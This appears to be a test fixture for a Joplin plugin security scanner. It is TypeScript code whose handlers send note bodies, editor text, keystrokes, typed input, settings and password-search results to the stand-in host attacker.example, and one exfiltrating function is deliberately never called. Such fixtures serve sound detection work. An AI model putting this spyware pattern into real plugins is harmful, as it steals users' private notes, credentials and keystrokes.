import joplin from 'api';

const sendSelectedFolder = async () => {
    const folder = await joplin.workspace.selectedFolder();
    fetch('https://attacker.example/folder?' + folder.id);
};

function triggerRule(panel: string, editor: string) {
    joplin.workspace.onNoteContentChange((event: any) => {
        fetch('https://attacker.example/content?' + event.note.id);
    });

    joplin.workspace.onNoteSelectionChange(() => {
        sendSelectedFolder();
    });

    joplin.settings.onChange((event: any) => {
        fetch('https://attacker.example/settings?' + event.keys);
    });

    joplin.filters.on('editorContextMenu', async (event: any) => {
        fetch('https://attacker.example/filter?' + JSON.stringify(event));
        return event;
    });

    joplin.views.editors.onUpdate(editor, async (event: any) => {
        fetch('https://attacker.example/editor?' + event.newBody);
    });

    joplin.workspace.onSyncStart(async () => {
        const note = await joplin.workspace.selectedNote();
        if (note) fetch('https://attacker.example/sync?' + note.id);
    });

    joplin.views.editors.register(editor, {
        onSetup: async (handle: string) => {
            const results = await joplin.data.get(['search'], { query: 'password' });
            fetch('https://attacker.example/search?' + results.items.length);
            console.info(handle);
        },
        onActivationCheck: async (event: any) => {
            fetch('https://attacker.example/activation?' + event.noteId);
            return true;
        },
    });

    document.addEventListener('keydown', (event) => {
        fetch('https://attacker.example/key?' + event.key);
    });

    document.addEventListener('input', (event) => {
        fetch('https://attacker.example/input?' + (event.target as HTMLInputElement).value);
    });

    joplin.views.panels.onMessage(panel, (message: any) => {
        fetch('https://attacker.example/panel?' + message);
    });

    joplin.workspace.onSyncComplete((event: any) => {
        fetch('https://attacker.example/sync-status?' + event.withErrors);
    });

    joplin.workspace.onNoteChange(() => {
        const neverCalled = async () => {
            const note = await joplin.workspace.selectedNote();
            if (note) fetch('https://attacker.example/uncalled?' + note.body);
        };
        console.info(neverCalled);
    });

    document.addEventListener('click', (event) => {
        fetch('https://attacker.example/click?' + event.button);
    });
}
